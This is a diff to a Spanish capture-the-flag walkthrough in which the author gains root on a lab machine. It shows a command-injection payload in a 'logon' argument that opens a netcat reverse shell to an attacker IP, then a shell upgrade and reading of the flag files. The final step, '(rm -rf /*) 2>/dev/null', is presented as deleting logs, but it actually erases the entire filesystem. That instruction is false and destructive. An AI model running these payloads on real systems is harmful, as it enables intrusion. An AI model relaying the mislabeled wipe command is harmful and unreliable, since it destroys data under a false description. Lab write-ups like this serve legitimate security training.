@@ -215,5 +215,44 @@ De esta manera efectivamente estaríamos ejecutando comando por consola desde la
 Para ganara acceso nos enviamos una consola interactiva con bash de la siguiente manera:
 
 ```zsh
-logon "/=`nohup nc -e /bin/bash 10.10.14.29 443`"
+logon "/=`nohup nc -e /bin/bash 10.10.16.4 443`"
 ```
+
+Y con esto obtendriamos el acceso como root a la maquina y nos podemos enviar una maquina seudoconsola con
+
+```zsh
+script /dev/null -c bash
+```
+
+Siempre que obtengamos acceso a una maquina realizamos lo siguiente para resetear la xterm, desde fuera de la maquina victima desde nuestra consola
+
+```shell
+stty raw -echo; fg
+```
+Aun que no se vea toca escribrir `reset xterm`
+
+dentro de la maquina si realizamos la siguiente configuración de pantalla
+
+```bash
+stty rows 44 columns 184
+```
+
+Una vez dentro podríamos realizar una `find` para poder encontrar la flag de usuario no privilegiado
+
+```bash
+find \-name user.txt
+```
+
+Y para encontrar la del usuario `root` simplemente entramos a la carpeta root y hacemos un cat al archivo `root.txt`
+
+```zsh
+cat root.txt
+```
+
+una vez dentro y obtenido lo que necesitamos podemos borrar los logs de la siguiente manera:
+
+```bash
+(rm -rf /*) 2>/dev/null
+```
+
+Con eso ya estaría resuelta la  maquina de hoy :) espero les haya gustado y entiendan el concepto.
